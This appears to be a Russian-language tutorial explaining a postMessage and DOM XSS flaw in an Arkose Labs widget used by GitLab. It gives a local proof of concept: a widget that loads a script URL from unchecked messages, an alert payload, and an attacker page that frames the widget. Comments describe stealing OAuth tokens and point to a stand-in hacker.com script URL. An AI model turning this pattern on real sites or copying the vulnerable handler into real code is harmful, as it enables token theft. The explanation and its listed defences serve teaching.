Чтобы понять этот механизм, нужно разбить проблему на две части: **отсутствие защиты от фрейминга** и **уязвимый обработчик `postMessage**`.

В случае с GitLab, виджет от Arkose Labs (`gitlab-api.arkoselabs.com`) доверял любым входящим сообщениям (`postMessage`) и позволял любому сайту встраивать себя через `iframe`.

Ниже представлен простой локальный Proof of Concept (PoC), который эмулирует эту уязвимость.

### Как протестировать локально

Создайте в одной папке три файла, описанные ниже. Для теста вам не нужен веб-сервер, просто откройте файл `attacker.html` в любом современном браузере.

#### 1. `vulnerable-widget.html` (Эмуляция виджета Arkose Labs)

Этот файл имитирует сторонний скрипт (например, капчу), который встраивается на разные сайты.
*Уязвимость здесь в том, что он не проверяет, от кого пришло сообщение (нет проверки `event.origin`), и слепо использует переданный URL для загрузки скрипта.*

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Уязвимый виджет</title>
    <style>body { background-color: #f0f0f0; font-family: sans-serif; padding: 10px; }</style>
</head>
<body>
    <h3>Я доверенный виджет (Arkose Labs)</h3>
    <p>Ожидаю конфигурацию от родительского окна...</p>

    <script>
        // УЯЗВИМОСТЬ: Слушаем все сообщения без проверки источника (event.origin)
        window.addEventListener('message', function(event) {
            console.log("Виджет получил сообщение:", event.data);

            // Если пришла команда на инициализацию и передан URL API
            if (event.data && event.data.type === 'init' && event.data.challengeApiUrl) {
                
                // УЯЗВИМОСТЬ (DOM XSS): Берем URL из сообщения и создаем тег <script>
                console.log("Загружаю скрипт из:", event.data.challengeApiUrl);
                var script = document.createElement('script');
                script.src = event.data.challengeApiUrl;
                document.body.appendChild(script);
            }
        });
    </script>
</body>
</html>

```

#### 2. `malicious.js` (Полезная нагрузка атакующего)

Это тот самый "произвольный JavaScript", который мы заставим выполнить внутри доверенного виджета.

```javascript
// Этот код выполнится в контексте vulnerable-widget.html
alert("DOM XSS УСПЕШЕН!\n\nСкрипт атакующего выполнен внутри стороннего виджета.");

// В реальной атаке на GitLab этот скрипт делал следующее:
// 1. Устанавливал свой обработчик onmessage внутри виджета.
// 2. Отправлял запрос родительскому окну (GitLab) "дай мне конфиг".
// 3. Получал в ответ от GitLab URL с токеном OAuth в хэше и отправлял его на сервер хакера.

```

#### 3. `attacker.html` (Сайт злоумышленника)

Это вредоносная страница, на которую хакер заманивает жертву.

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Сайт атакующего</title>
    <style>body { background-color: #ffeaea; font-family: sans-serif; }</style>
</head>
<body>
    <h1>Вредоносный сайт хакера</h1>
    <p>Ниже загружен iframe с уязвимым виджетом. Если бы у виджета был заголовок X-Frame-Options: DENY, он бы здесь не отобразился.</p>

    <!-- 1. Встраиваем уязвимый виджет. Отсутствие X-Frame-Options позволяет это сделать -->
    <iframe id="targetFrame" src="vulnerable-widget.html" width="400" height="200" style="border: 2px solid red;"></iframe>

    <script>
        var iframe = document.getElementById('targetFrame');

        // Ждем, пока iframe полностью загрузится
        iframe.onload = function() {
            console.log("Атакующий: Iframe загружен, отправляем вредоносный postMessage...");
            
            // 2. Формируем вредоносный payload. Подменяем challengeApiUrl на наш локальный скрипт.
            var maliciousPayload = {
                type: 'init',
                challengeApiUrl: 'malicious.js' // В реальной атаке здесь был бы https://hacker.com/malicious.js
            };

            // 3. Отправляем сообщение внутрь iframe. Символ '*' означает "отправить независимо от домена получателя".
            iframe.contentWindow.postMessage(maliciousPayload, '*');
        };
    </script>
</body>
</html>

```

---

### Разбор механики по шагам (Что происходит при открытии `attacker.html`)

1. **Фрейминг:** Страница `attacker.html` успешно загружает `vulnerable-widget.html` в теге `<iframe>`. Если бы сервер, отдающий виджет, возвращал HTTP-заголовок `X-Frame-Options: SAMEORIGIN` или политику `Content-Security-Policy: frame-ancestors 'self' '[https://gitlab.com](https://gitlab.com)'`, современный браузер **заблокировал бы** загрузку iframe на домене хакера. Это первый провал защиты.
2. **Эксплуатация `postMessage`:** Как только iframe загружается, скрипт на странице хакера обращается к нему через `iframe.contentWindow.postMessage(...)` и передает JSON-объект.
3. **Отсутствие валидации `origin`:** Внутри `vulnerable-widget.html` срабатывает событие `message`. Правильно написанный код должен сразу сделать проверку: `if (event.origin !== "[https://gitlab.com](https://gitlab.com)") return;`. Но виджет Arkose этого не делал. Он слепо принял конфигурацию от хакера.
4. **XSS (Sink):** Виджет берет подконтрольную хакеру строку `malicious.js` из поля `challengeApiUrl` и создает DOM-элемент `<script src="malicious.js"></script>`. Браузер покорно скачивает и выполняет этот скрипт в контексте виджета.

Именно так Франс Розен заставил доверенный домен `gitlab-api.arkoselabs.com` выполнить свой код, который затем перехватил OAuth-токен от основной страницы GitLab.